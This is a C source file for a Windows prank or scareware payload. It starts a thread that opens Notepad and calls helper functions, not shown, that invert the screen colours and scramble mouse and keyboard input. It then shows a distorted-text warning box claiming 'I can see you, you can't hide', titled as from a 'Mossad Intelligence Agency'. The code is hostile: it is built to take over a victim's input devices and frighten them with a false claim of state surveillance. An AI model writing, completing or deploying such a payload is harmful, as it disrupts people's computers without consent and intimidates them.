#include "headers/spookypyld.h"

DWORD WINAPI OtherFunc(){
    ShellExecuteA(NULL, "open", "notepad.exe", NULL, NULL, SW_SHOW);
    InvertColor();
    scrambleMouseAndKey();

    return 0;

}

void spookypyld(){

    CreateThread(NULL, 0, OtherFunc, NULL, 0, NULL);
    
    MessageBoxW(NULL, L"Ḭ̷̥̩̩̘̀̓́̿̍͠ ̴̢̛͓̤̳̰̑̅̃͝Ç̷̧̗̩͙̥̿̔̋͆̏å̸̧̤̮͓͉̄̒͘̚͠ñ̸̦͎̠̬̣̓̒̋̌̓ ̸̠͍̟̥̜̀̽̾͆̿§̶̛͕̤̝͙̓̋͋́͜ệ̶̦̩͕̩̀̒͊̈̕ê̵̛̯͉͚͈̣̐̅͋̕ ̶̮̰͇̬͚͊̕͝͝͝¥̸̺͇͕̩̥̈́͆̃̓͌ð̶̡̛̤͍̗̞́͊̿͝µ̵̧̞̰̺̲̉̿͗́͆!̴̱̙̬̪̩͗̀͗̋͠!̷̧̗̠͍̙̾̀̍̈́̾!̴̬͍̬̪̫͌̌͋͘͝!̵̡͇̫̦͕̐̾͂̾͠ ̸̧̼̳̜̙͒̃͌̓͑¥̶̨̯̪̟̮̎͌́̍̚ð̷̨͈̯̠̹̆̈́̾͌̕µ̶̝̣͕͍̻͆̀͂͘͝ ̸̢͇̼̟͉̀̿͊̑̒Ç̷̜̦̜̯͔͗̎̈́̊̓ą̶͎̹͓̼̊̔͊͆͊́ñ̴̨̤̬̫̩̈́̉̓̆͆'̵̧͎͙̞̭͂̍̿̽͠†̴̛̛͖̹͔͈̜̍̓̓ ̶̟͔͕̗̣̃͊̂̈͘Ḫ̶͖̮̮͔̌͒̒͆͝ï̴͇̱̞̙̩̔̉̅̌͆Ð̶̞̤̤̦̤̉̌̈́̌̇ȩ̵̢̞͍̭̂͛̃̕̚̚!̴̛̣̮̞̫͔͌͒̐̅!̷̙̮̤̥̜̈͊͗̉̏!̴̨̥͍̙̌͋̀͊͘ͅ ̷̢̰̻̟̟́͂̕̕͘Q̸̢̲̺̣̹̃̋̾̈́̈Ú̸̙͕̙̌͌̐̂͘͜ͅÌ̶̪̬̣̣̅͌͛̍̾ͅ†̶̧̛͕̦͖̤̀͗̐͒ ̷̠͚͉̝̇̉̿̈́͝ͅH̵͓̗͍̺̠̄̈́̽̈́͆Ì̶̱̫̖̟͙̓͊̑̈́̅Ð̸̡̤̹̝͎̈́̑̾̿͒Ì̶̡̯̬͔̥̍͌̎̽̓ņ̷̛̝̜̱͖̃̾̍̉͑G̸̢̱̯͖̈́̔̿́͜͝", L"M̶͖̫̪͓̲̉̇̎̚͘ð̶̗̗̞͈̻͐̀̈́̍͝§̶̢̻̘̺͙͛͑̄̑̽§̴̨͖͈̗͇̇͌͒̉̈́å̴̢̛̺̜͈̺̒̍͌̈Ð̵̞͎̞̟̖͛̎̇͊͝ ̴̢̹͎̝͙̄̈̐̅̍Ì̶̖̣̘̠͙͂͌̓̃̚ñ̵͓͙͙̰̭́̽̏̇͝†̸̙͓̳̘͉̋͋̈͐͠ê̴̦̭̙͇̭̊͋̄̄̔l̴̖̞͔̱̖̋͆̅́̚ļ̴̲͓̥̣̇̀͆̑̔ê̴̩̼̝͇̪͆͂̆̿͘g̶̢̧̛̦̞̞̀͊̒͘ê̵̗̩̯͖̪̑̂̎̓̾ñ̷̳͇̫̝̈́̄̅͛̈́͜¢̵̙̟̻̝͈̽͑̇̅͋ȩ̷͉͕̲̲̂̌͑̾̈́͆ ̵̡̫̞͕͂̉͑͗̾ͅÄ̸̢͔͈̂͑͒́̌͜͜ġ̸̗͖̱͈̻͋̄̒̃ê̶̛̠̭͉̥͈̌͛̿͘ņ̴̧͇̣͍̃͆̃̉̂͠¢̶̞̜̝͔̟̿̿̔͘̚¥̷̢̛̬̱̙͋͛͘͝ͅ", MB_OK | MB_ICONWARNING);
   
}